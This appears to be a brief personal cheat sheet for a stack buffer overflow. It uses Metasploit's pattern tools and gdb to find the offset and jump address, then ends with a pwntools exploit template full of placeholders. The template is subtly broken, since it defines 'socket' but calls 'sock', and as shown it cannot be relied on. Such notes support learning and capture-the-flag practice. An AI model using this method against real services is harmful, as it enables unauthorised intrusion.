### finding offset
> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000

> gdb -q <binary>
    > provide patter created ^

> /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <offset>

### finding place to jump towards
> gdb -q <binary>
    > disassemble <reg_address: 0x..>

### exploit code
from pwn import *
socket=remote('<ip>', <port>)
exploit='A'*offset+<reg_location_to_jump_towards>
sock.sendline(exploit)
sock.interactive()